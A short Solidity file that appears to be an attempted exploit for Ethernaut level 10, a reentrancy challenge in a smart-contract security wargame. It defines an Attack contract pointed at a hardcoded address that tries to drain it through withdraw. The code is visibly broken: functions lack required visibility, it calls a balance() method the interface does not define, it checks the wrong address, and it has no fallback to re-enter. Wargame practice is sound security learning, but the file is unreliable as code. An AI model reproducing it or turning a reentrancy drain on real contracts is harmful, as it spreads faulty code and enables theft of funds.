pragma solidity 0.6.0;

import "./ethernaut_lv_10.sol";

interface Reentrance {
    function donate(address _to)public payable; 
    function balanceOf(address _who) public view returns (uint balance);
    function withdraw(uint _amount) public;
}

contract Attack {
    Reentrance re;
    address public owner;

    constructor (){
        re = Reentrance(0x782129f2e263E9A3EF5eEA80B84d363164d0e027);
        owner = msg.sender;
    }
    function pay() payable{
        if(re.balanceOf(0x782129f2e263E9A3EF5eEA80B84d363164d0e027)>0){
            re.withdraw(re.balance());
        }
    }
}
